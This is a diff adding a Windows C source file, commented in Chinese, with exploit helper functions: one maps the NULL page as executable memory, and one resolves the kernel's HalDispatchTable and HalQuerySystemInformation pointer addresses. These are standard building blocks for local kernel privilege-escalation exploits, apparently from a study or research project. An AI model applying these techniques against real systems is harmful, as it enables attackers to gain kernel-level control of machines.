@@ -1,0 +1,133 @@
+#include "base.h"
+#pragma comment(linker, "/default:ntdll.lib")
+
+#define PAGE_SIZE 0x1000
+#define KERNEL_NAME_LENGTH 0X0D
+
+BOOL AllocateZeroMemory()
+{
+	NTSTATUS status = STATUS_SUCCESS;
+	PVOID pZeroAddress = NULL;
+	DWORD dwZeroSize = PAGE_SIZE;
+	BOOL bRet = TRUE;
+
+	// 获得0地址的内存
+	pZeroAddress = (PVOID)sizeof(ULONG);
+	status = NtAllocateVirtualMemory(NtCurrentProcess(),
+									 &pZeroAddress,
+									 0,
+									 &dwZeroSize,
+									 MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
+									 PAGE_EXECUTE_READWRITE);
+	if (!NT_SUCCESS(status))
+	{
+		ShowError("NtAllocateVirtualMemory", status);
+		bRet = FALSE;
+		goto exit;
+	}
+
+
+exit:
+	return bRet;
+}
+
+PVOID GetHalDispatchTable()
+{
+	NTSTATUS status = STATUS_SUCCESS;
+	DWORD dwReturnLength = 0;
+	PSYSTEM_MODULE_INFORMATION pModuleInformation = NULL;
+	DWORD dwImageBase = 0;
+	PVOID pMappedBase = NULL;
+	UCHAR szImageName[KERNEL_NAME_LENGTH] = { 0 };
+	UNICODE_STRING uDllName;
+	PVOID pHalDispatchTable = NULL, pXHalQuerySystemInformation = NULL;
+	DWORD dwDllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;
+
+
+	// 此时dwReturnLength是0，所以函数会由于长度为0执行失败
+	// 然后系统会在第四个参数指定的地址保存需要的内存大小
+	status = ZwQuerySystemInformation(SystemModuleInformation,
+									  pModuleInformation,
+									  dwReturnLength,
+		                              &dwReturnLength);
+
+	if (status != STATUS_INFO_LENGTH_MISMATCH)
+	{
+		ShowError("ZwQuerySystemInformation", status);
+		goto exit;
+	}
+
+	// 按页大小对齐
+	dwReturnLength = (dwReturnLength & 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);
+	pModuleInformation = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL,
+																  dwReturnLength,
+																  MEM_COMMIT | MEM_RESERVE,
+																  PAGE_READWRITE);
+	if (!pModuleInformation)
+	{
+		printf("VirtualAlloc Error");
+		goto exit;
+	}
+
+	status = ZwQuerySystemInformation(SystemModuleInformation,
+									  pModuleInformation,
+									  dwReturnLength,
+									  &dwReturnLength);
+	if (!NT_SUCCESS(status))
+	{
+		ShowError("ZwQuerySystemInformation", status);
+		goto exit;
+	}
+
+	// 模块加载的基地址
+	dwImageBase = (DWORD)(pModuleInformation->Module[0].Base);
+
+	// 获取模块名
+	RtlMoveMemory(szImageName,
+		(PVOID)(pModuleInformation->Module[0].ImageName + pModuleInformation->Module[0].PathLength),
+		KERNEL_NAME_LENGTH);
+	// 转换为UNICODE_STRING类型
+	RtlCreateUnicodeStringFromAsciiz(&uDllName, (PUCHAR)szImageName);
+
+	status = (NTSTATUS)LdrLoadDll(NULL,
+								  &dwDllCharacteristics,
+								  &uDllName,
+								  &pMappedBase);
+
+	if (!NT_SUCCESS(status))
+	{
+		ShowError("LdrLoadDll", status);
+		goto exit;
+	}
+
+	// 获取内核HalDispatchTable函数表地址
+	pHalDispatchTable = GetProcAddress((HMODULE)pMappedBase, "HalDispatchTable");
+
+	if (pHalDispatchTable == NULL)
+	{
+		printf("GetProcAddress Error\n");
+		goto exit;
+	}
+
+	pHalDispatchTable = (PVOID)((DWORD)pHalDispatchTable - (DWORD)pMappedBase + dwImageBase);
+	pXHalQuerySystemInformation = (PVOID)((DWORD)pHalDispatchTable + sizeof(ULONG));
+
+exit:
+	if (pModuleInformation)
+	{
+		VirtualFree(pModuleInformation,
+					dwReturnLength,
+					MEM_DECOMMIT | MEM_RELEASE);
+	}
+	if (pMappedBase)
+	{
+		LdrUnloadDll(pMappedBase);
+	}
+
+	return pXHalQuerySystemInformation;
+}
+
+void ShowError(char *msg, DWORD dwErrorCode)
+{
+	printf("%s Error 0x%X\n", msg, dwErrorCode);
+}
